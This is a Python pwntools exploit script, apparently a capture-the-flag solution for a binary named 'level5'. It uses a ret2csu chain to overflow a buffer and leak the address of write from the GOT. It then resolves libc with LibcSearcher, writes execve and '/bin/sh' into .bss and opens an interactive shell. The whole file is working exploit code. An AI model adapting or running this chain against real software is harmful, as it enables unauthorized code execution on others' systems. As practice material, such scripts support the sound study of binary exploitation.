#!/usr/bin/env python
from pwn import *
from LibcSearcher import *
# context.log_level = 'debug'
context.arch = 'amd64'
p = process('./level5')
# p = remote('127.0.0.1',10001)
elf = ELF('./level5')
write_got = elf.got['write']
read_got = elf.got['read']
main = elf.symbols['main']
bss = elf.bss()
log.success('write_got = ' + hex(write_got))
log.success('read_got = ' + hex(read_got))
log.success('main = ' + hex(main))
log.success('bss = ' + hex(bss))
# gdb.attach(p)

#  400600:       4c 89 ea                mov    rdx,r13
#  400603:       4c 89 f6                mov    rsi,r14
#  400606:       44 89 ff                mov    edi,r15d
#  400609:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  40060d:       48 83 c3 01             add    rbx,0x1
#  400611:       48 39 eb                cmp    rbx,rbp
#  400614:       75 ea                   jne    400600 <__libc_csu_init+0x40>
#  400616:       48 83 c4 08             add    rsp,0x8
#  40061a:       5b                      pop    rbx
#  40061b:       5d                      pop    rbp
#  40061c:       41 5c                   pop    r12
#  40061e:       41 5d                   pop    r13
#  400620:       41 5e                   pop    r14
#  400622:       41 5f                   pop    r15
#  400624:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
	payload = flat(['A' * 136, 0x40061a, rbx, rbp, r12, r13, r14, r15, 0x400600, 'B' * 56, ret_addr])
	# print repr(payload)
	p.recvuntil('Hello, World\n')
	p.send(payload)
	sleep(1)

# rdi = edi = r15, rsi = r14, rdx = r13
# write(STDOUT_FILENO, write_got, 8)
# r12 = write_got
# rdi = 1, rsi = write_got, rdx = 8
log.info('>>> OUTPUT &write_got <<<')
csu(0, 1, write_got, 8, write_got, 1, main)
write = u64(p.recv(8).ljust(8, '\x00'))
log.success('write = ' + hex(write))
libc = LibcSearcher('write', write)
log.info('>>> SEARCHING FOR LIBC <<<')
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
execve = libc_base + libc.dump('execve')
log.success('libc_base = ' + hex(libc_base))
log.success('system = ' + hex(system))
log.success('execve = ' + hex(execve))

# read(STDIN_FILENO, bss, 16)
# r12 = read_got
# rdi = 0, rsi = bss, rdx = 16
log.info('>>> INPUT execve/system AND str_bin_sh <<<')
csu(0, 1, read_got, 16, bss, 0, main)
p.send(p64(execve) + '/bin/sh\x00')
sleep(1)

# execve("/bin/sh") or system("/bin/sh")
# r12 = execve/system
# rdi = bss + 8 = "/bin/sh"
log.info('>>> EXECUTE execve("/bin/sh") OR system("/bin/sh") <<<')
csu(0, 1, bss, 0, 0, bss + 8, main)
log.info('>>> PWNED BY ASSASSINQ <<<')
p.interactive()
